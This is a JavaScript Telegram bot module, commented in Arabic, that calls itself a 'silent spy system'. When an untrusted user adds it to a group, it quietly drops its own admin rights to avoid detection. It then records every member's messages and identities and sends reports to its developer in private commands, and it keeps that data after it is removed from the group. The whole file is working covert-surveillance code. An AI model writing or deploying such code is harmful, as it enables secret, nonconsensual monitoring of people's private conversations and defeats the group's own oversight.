// ============================================================
//  handler_spy.js — نظام التجسس الصامت v1.0
//  ✅ التحقق من المضيف عند الإضافة
//  ✅ إذا لم يكن مالكاً أو مشرفاً كاملاً → وضع صامت تام
//  ✅ يقرأ الرسائل ويدوّن الأعضاء بصمت
//  ✅ نظام مكافحة الإزالة (Anti-Removal)
//  ✅ عرض تقرير الأعضاء للمطور فقط
// ============================================================

const db = require('./db');
const { DEVELOPER_ID } = require('./config');

// ── مجموعات الوضع الصامت (bot مُضاف من غير إذن) ──────────────
// chatId → { addedBy, addedAt, memberLog: Map }
// نستخدم global حتى تشاركها كل الهاندلرز الأخرى
if (!global._silentGroups) global._silentGroups = new Map();
const silentGroups = global._silentGroups;

// ── سجل مراقبة الرسائل في المجموعات الصامتة ─────────────────
// chatId → [ { userId, username, firstName, text, date } ]
const messageLog = new Map();

// ── عداد محاولات الإزالة لكل مجموعة ──────────────────────────
const removalAttempts = new Map();

// ─── هل المجموعة في وضع صامت؟ ──────────────────────────────
function isSilentGroup(chatId) {
  return silentGroups.has(chatId);
}

// ─── تسجيل رسالة في السجل الصامت ───────────────────────────
function logMessage(chatId, from, text) {
  if (!messageLog.has(chatId)) messageLog.set(chatId, []);
  const log = messageLog.get(chatId);
  log.push({
    userId:    from.id,
    username:  from.username  || '',
    firstName: from.first_name || String(from.id),
    text:      text || '[ميديا/ملصق]',
    date:      new Date().toISOString(),
  });
  // احتفظ بآخر 500 رسالة فقط
  if (log.length > 500) log.splice(0, log.length - 500);
}

// ─── التحقق من صلاحيات المضيف الكاملة ──────────────────────
async function hasFullPermissions(bot, chatId, userId) {
  try {
    const member = await bot.telegram.getChatMember(chatId, userId);
    if (member.status === 'creator') return true;
    if (member.status !== 'administrator') return false;

    // يجب أن يكون مشرفاً بكل الصلاحيات الأساسية
    const perms = member;
    return !!(
      perms.can_manage_chat &&
      perms.can_delete_messages &&
      perms.can_restrict_members &&
      perms.can_invite_users
    );
  } catch {
    return false;
  }
}

// ─── بناء تقرير أعضاء المجموعة الصامتة ───────────────────────
async function buildMembersReport(bot, chatId) {
  const info = silentGroups.get(chatId);
  if (!info) return null;

  const g = db.getGroup(chatId);
  const members = g ? [...g.members.entries()] : [];

  let report = `🕵️ *تقرير مجموعة صامتة*\n\n`;
  report += `📌 *المجموعة:* \`${info.title || chatId}\`\n`;
  report += `🆔 *Chat ID:* \`${chatId}\`\n`;
  report += `👤 *أضافني:* ${info.addedByUsername ? `@${info.addedByUsername}` : `\`${info.addedBy}\``}\n`;
  report += `📅 *تاريخ الإضافة:* ${new Date(info.addedAt).toLocaleString('ar')}\n`;
  report += `📊 *إجمالي الأعضاء المرصودين:* \`${members.length}\`\n`;
  report += `💬 *رسائل مسجّلة:* \`${(messageLog.get(chatId) || []).length}\`\n\n`;

  if (members.length > 0) {
    report += `━━━━━━━━━━━━━━━━━━\n👥 *قائمة الأعضاء:*\n\n`;
    for (const [uid, m] of members.slice(0, 50)) {
      const uname  = m.username  ? `@${m.username}`  : '—';
      const fname  = m.firstName || m.username || String(uid);
      const status = m.status === 'admin'  ? '🛡️ مشرف' :
                     m.status === 'owner'  ? '👑 مالك'  : '👤 عضو';
      const msgs   = m.messageCount || 0;
      report += `${status} *${fname}*\n`;
      report += `  🆔 \`${uid}\`  •  ${uname}\n`;
      report += `  💬 رسائل: \`${msgs}\`\n\n`;
    }
    if (members.length > 50) {
      report += `_... و ${members.length - 50} عضو آخر_\n`;
    }
  }

  return report;
}

// ─── بناء تقرير آخر الرسائل المسجّلة ───────────────────────
function buildMessagesReport(chatId, limit = 20) {
  const logs = (messageLog.get(chatId) || []).slice(-limit);
  if (!logs.length) return '📭 لا توجد رسائل مسجّلة بعد.';

  let report = `💬 *آخر ${logs.length} رسالة مسجّلة:*\n\n`;
  for (const entry of logs) {
    const uname = entry.username ? `@${entry.username}` : `\`${entry.userId}\``;
    const text  = entry.text.length > 80 ? entry.text.slice(0, 80) + '...' : entry.text;
    const time  = new Date(entry.date).toLocaleTimeString('ar');
    report += `[${time}] ${uname}: ${text}\n`;
  }
  return report;
}

// ════════════════════════════════════════════════════════════════
module.exports = function setupSpy(bot) {

  // ══════════════════════════════════════════════════════════════
  //  1) كشف إضافة البوت — التحقق الفوري من المضيف
  // ══════════════════════════════════════════════════════════════
  bot.on('my_chat_member', async (ctx) => {
    const upd     = ctx.myChatMember;
    const { chat, from } = upd;
    const newStat = upd.new_chat_member.status;
    const oldStat = upd.old_chat_member.status;

    // فقط عند الانضمام للمجموعات (ليس القنوات)
    if (chat.type === 'channel' || chat.type === 'private') return;

    const joined = (newStat === 'member' || newStat === 'administrator') &&
                   (oldStat === 'left'   || oldStat === 'kicked');
    if (!joined) return;

    // إذا كان المضيف هو المطور — وضع عادي، لا تجسس
    if (from.id === DEVELOPER_ID) return;

    // تحقق: هل المضيف موثوق (مشرف بوت معتمد)؟
    const isTrusted = db.isBotAdmin(from.id);
    if (isTrusted) {
      if (silentGroups.has(chat.id)) silentGroups.delete(chat.id);
      return; // مشرف بوت معتمد — وضع عادي
    }

    // ══════════════════════════════════════════════════════
    // 🥷 الحل الذكي: أُضفنا كـ administrator؟
    //    → نخفض صلاحياتنا فوراً لعضو عادي قبل أي بوت يشوفنا
    //    → ثم ندخل الوضع الصامت
    // ══════════════════════════════════════════════════════
    if (newStat === 'administrator') {
      // نحاول نزيل صلاحياتنا فوراً بأسرع وقت ممكن
      try {
        await bot.telegram.promoteChatMember(chat.id, ctx.botInfo.id, {
          can_manage_chat:        false,
          can_delete_messages:    false,
          can_manage_video_chats: false,
          can_restrict_members:   false,
          can_promote_members:    false,
          can_change_info:        false,
          can_invite_users:       false,
          can_pin_messages:       false,
        });
      } catch {}
    }

    // التحقق من صلاحيات المضيف الحقيقية
    const hasPerms = await hasFullPermissions(bot, chat.id, from.id);

    if (!hasPerms) {
      // 🔇 وضع صامت تام — لا نرسل أي رسالة
      silentGroups.set(chat.id, {
        title:           chat.title || String(chat.id),
        addedBy:         from.id,
        addedByUsername: from.username || from.first_name || String(from.id),
        addedAt:         new Date().toISOString(),
        silent:          true,
      });

      if (!messageLog.has(chat.id)) messageLog.set(chat.id, []);

      // إشعار المطور فقط (في الخاص)
      try {
        await bot.telegram.sendMessage(
          DEVELOPER_ID,
          `🕵️ *وضع صامت مُفعَّل*\n\n` +
          `📌 المجموعة: *${chat.title}*\n` +
          `🆔 \`${chat.id}\`\n` +
          `👤 أضافني: ${from.username ? `@${from.username}` : from.first_name} (\`${from.id}\`)\n` +
          `⚠️ _خفضت صلاحياتي تلقائياً — وضع صامت_\n\n` +
          `🔇 البوت صامت — يراقب ويدوّن فقط`,
          { parse_mode: 'Markdown' }
        );
      } catch {}

      console.log(`🕵️ [SPY] وضع صامت: ${chat.title} (${chat.id}) — أضافه ${from.username || from.id}`);
      return;
    }

    // المضيف مالك أو مشرف كامل → وضع عادي
    if (silentGroups.has(chat.id)) silentGroups.delete(chat.id);
  });

  // ══════════════════════════════════════════════════════════════
  //  2) مراقبة الرسائل في المجموعات الصامتة (صامت تام)
  // ══════════════════════════════════════════════════════════════
  bot.use(async (ctx, next) => {
    const msg = ctx.message || ctx.editedMessage;
    if (!msg || !ctx.from || !ctx.chat) return next();
    if (ctx.chat.type === 'private' || ctx.chat.type === 'channel') return next();

    if (isSilentGroup(ctx.chat.id)) {
      // دوّن الرسالة بصمت — لا ترد
      const text = msg.text || msg.caption || '';
      logMessage(ctx.chat.id, ctx.from, text);

      // تحديث بيانات العضو في قاعدة البيانات بصمت
      const g = db.getGroup(ctx.chat.id);
      if (g) {
        db.trackMember(ctx.chat.id, ctx.from.id, ctx.from.username || '', ctx.from.first_name || '');
        const m = g.members.get(ctx.from.id);
        if (m) {
          m.messageCount  = (m.messageCount || 0) + 1;
          m.lastMessageAt = new Date();
          db.markDirty?.();
        }
      }

      return; // ← لا تمرر لأي handler آخر
    }

    return next();
  });

  // ══════════════════════════════════════════════════════════════
  //  3) مكافحة الإزالة — Anti-Removal System
  //  يرصد محاولة إزالة البوت ويحاول إعادة نفسه أو يوثّق المحاولة
  // ══════════════════════════════════════════════════════════════
  bot.on('my_chat_member', async (ctx) => {
    const upd     = ctx.myChatMember;
    const { chat, from } = upd;
    const newStat = upd.new_chat_member.status;
    const oldStat = upd.old_chat_member.status;

    const wasRemoved = (newStat === 'left' || newStat === 'kicked') &&
                       (oldStat === 'member' || oldStat === 'administrator' || oldStat === 'restricted');
    if (!wasRemoved) return;

    const chatId = chat.id;

    // سجّل محاولة الإزالة
    if (!removalAttempts.has(chatId)) removalAttempts.set(chatId, []);
    removalAttempts.get(chatId).push({
      by:     from.id,
      byUser: from.username || from.first_name || String(from.id),
      at:     new Date().toISOString(),
    });

    const isSilent = silentGroups.has(chatId);
    const info     = silentGroups.get(chatId);

    // أبلغ المطور
    try {
      await bot.telegram.sendMessage(
        DEVELOPER_ID,
        `⚠️ *محاولة إزالة رُصدت!*\n\n` +
        `📌 المجموعة: *${chat.title}*\n` +
        `🆔 \`${chatId}\`\n` +
        `👤 أزالني: ${from.username ? `@${from.username}` : from.first_name} (\`${from.id}\`)\n` +
        `🕵️ كانت صامتة: ${isSilent ? 'نعم' : 'لا'}\n` +
        `📊 محاولات إزالة: \`${removalAttempts.get(chatId).length}\`\n\n` +
        (isSilent
          ? `📋 *ملاحظة:* لديك تقرير محفوظ — أرسل /spy_report ${chatId} لرؤيته`
          : ''),
        { parse_mode: 'Markdown' }
      );
    } catch {}

    // استراتيجية مكافحة البوتات المزيلة:
    // إذا كانت المجموعة صامتة (مضيف غير موثوق) — احتفظ بالبيانات ولا تحذفها
    if (isSilent) {
      // لا تحذف من silentGroups — ابقِ السجل
      console.log(`🛡️ [ANTI-REMOVAL] محاولة إزالة من مجموعة صامتة: ${chatId}`);
      // لا تحذف البيانات من db أيضاً
      return; // ← تجاوز الحذف التلقائي من db في handler_groups
    }

    console.log(`🛡️ [ANTI-REMOVAL] تم رصد إزالة من: ${chat.title} (${chatId})`);
  });

  // ══════════════════════════════════════════════════════════════
  //  4) أوامر المطور لاستعراض تقارير المجموعات الصامتة
  // ══════════════════════════════════════════════════════════════

  // /spy_list — قائمة كل المجموعات الصامتة
  bot.command('spy_list', async (ctx) => {
    if (ctx.from.id !== DEVELOPER_ID) return;
    if (ctx.chat.type !== 'private') return;

    const groups = [...silentGroups.entries()];
    if (!groups.length) {
      return ctx.reply('📭 لا توجد مجموعات في وضع صامت حالياً.');
    }

    let text = `🕵️ *المجموعات الصامتة (${groups.length}):*\n\n`;
    for (const [chatId, info] of groups) {
      const msgs    = (messageLog.get(chatId) || []).length;
      const g       = db.getGroup(chatId);
      const members = g ? g.members.size : 0;
      text +=
        `📌 *${info.title}*\n` +
        `🆔 \`${chatId}\`\n` +
        `👤 أضافه: @${info.addedByUsername}\n` +
        `👥 أعضاء: \`${members}\` • 💬 رسائل: \`${msgs}\`\n` +
        `📅 ${new Date(info.addedAt).toLocaleDateString('ar')}\n\n`;
    }
    text += `_استخدم: /spy\\_report [chatId] لتقرير تفصيلي_`;

    await ctx.replyWithMarkdown(text);
  });

  // /spy_report CHATID — تقرير تفصيلي بالأعضاء
  bot.command('spy_report', async (ctx) => {
    if (ctx.from.id !== DEVELOPER_ID) return;
    if (ctx.chat.type !== 'private') return;

    const args   = ctx.message.text.split(' ');
    const chatId = Number(args[1]);

    if (!chatId) {
      return ctx.reply('⚠️ استخدام: /spy_report [chatId]');
    }

    // يعمل حتى لو أُزيل البوت — البيانات محفوظة
    const info = silentGroups.get(chatId);
    const g    = db.getGroup(chatId);

    if (!info && !g) {
      return ctx.reply('❌ لا توجد بيانات لهذه المجموعة.');
    }

    // بناء تقرير الأعضاء
    const members = g ? [...g.members.entries()] : [];
    let report =
      `🕵️ *تقرير مجموعة صامتة*\n\n` +
      `📌 المجموعة: *${info?.title || g?.title || chatId}*\n` +
      `🆔 \`${chatId}\`\n`;

    if (info) {
      report +=
        `👤 أضافني: @${info.addedByUsername} (\`${info.addedBy}\`)\n` +
        `📅 ${new Date(info.addedAt).toLocaleString('ar')}\n`;
    }

    const removals = removalAttempts.get(chatId) || [];
    if (removals.length) {
      report += `⚠️ محاولات إزالة: \`${removals.length}\`\n`;
      report += `آخرها بواسطة: @${removals[removals.length - 1].byUser}\n`;
    }

    report += `\n👥 *أعضاء مرصودون: \`${members.length}\`*\n`;
    report += `━━━━━━━━━━━━━━━━━━\n\n`;

    for (const [uid, m] of members) {
      const uname  = m.username  ? `@${m.username}`  : '—';
      const fname  = m.firstName || m.username || String(uid);
      const status = m.status === 'admin'  ? '🛡️' :
                     m.status === 'owner'  ? '👑' : '👤';
      const msgs   = m.messageCount || 0;
      report +=
        `${status} *${fname}*\n` +
        `🆔 \`${uid}\` • ${uname}\n` +
        `💬 رسائل: \`${msgs}\`\n\n`;

      // إرسال على دفعات إذا طالت الرسالة
      if (report.length > 3500) {
        await ctx.replyWithMarkdown(report);
        report = '';
      }
    }

    if (report.trim()) {
      await ctx.replyWithMarkdown(report || '—');
    }

    // إرسال آخر الرسائل
    const msgReport = buildMessagesReport(chatId, 30);
    await ctx.replyWithMarkdown(`\n${msgReport}`);
  });

  // /spy_msgs CHATID — آخر الرسائل المسجّلة فقط
  bot.command('spy_msgs', async (ctx) => {
    if (ctx.from.id !== DEVELOPER_ID) return;
    if (ctx.chat.type !== 'private') return;

    const args   = ctx.message.text.split(' ');
    const chatId = Number(args[1]);
    const limit  = Number(args[2]) || 30;

    if (!chatId) return ctx.reply('⚠️ استخدام: /spy_msgs [chatId] [عدد]');

    const report = buildMessagesReport(chatId, limit);
    await ctx.replyWithMarkdown(report);
  });

  // /spy_removals — تقرير محاولات الإزالة
  bot.command('spy_removals', async (ctx) => {
    if (ctx.from.id !== DEVELOPER_ID) return;
    if (ctx.chat.type !== 'private') return;

    if (!removalAttempts.size) {
      return ctx.reply('📭 لم تُسجَّل أي محاولات إزالة حتى الآن.');
    }

    let text = `🛡️ *سجل محاولات الإزالة:*\n\n`;
    for (const [chatId, attempts] of removalAttempts.entries()) {
      const info = silentGroups.get(chatId);
      const g    = db.getGroup(chatId);
      const name = info?.title || g?.title || String(chatId);
      text += `📌 *${name}* (\`${chatId}\`)\n`;
      text += `محاولات: \`${attempts.length}\`\n`;
      for (const a of attempts.slice(-3)) {
        text += `  • @${a.byUser} — ${new Date(a.at).toLocaleString('ar')}\n`;
      }
      text += '\n';
    }

    await ctx.replyWithMarkdown(text);
  });

  // /spy_help — مساعدة
  bot.command('spy_help', async (ctx) => {
    if (ctx.from.id !== DEVELOPER_ID) return;
    if (ctx.chat.type !== 'private') return;

    await ctx.replyWithMarkdown(
      `🕵️ *أوامر نظام التجسس الصامت:*\n\n` +
      `/spy_list — قائمة كل المجموعات الصامتة\n` +
      `/spy_report [chatId] — تقرير تفصيلي بالأعضاء\n` +
      `/spy_msgs [chatId] [عدد] — آخر الرسائل المسجّلة\n` +
      `/spy_removals — سجل محاولات إزالة البوت\n\n` +
      `━━━━━━━━━━━━━━━━━━\n` +
      `🔇 *كيف يعمل النظام:*\n` +
      `• إذا أضافك شخص ليس مالكاً أو مشرفاً كاملاً\n` +
      `• البوت يصمت تماماً — لا يرد ولا يرسل\n` +
      `• يراقب الأعضاء والرسائل بصمت\n` +
      `• يُبلّغك فوراً في الخاص\n` +
      `• عند الإزالة: يحتفظ بكل البيانات`
    );
  });

  console.log('🕵️ نظام التجسس الصامت مُفعَّل ✅');
};
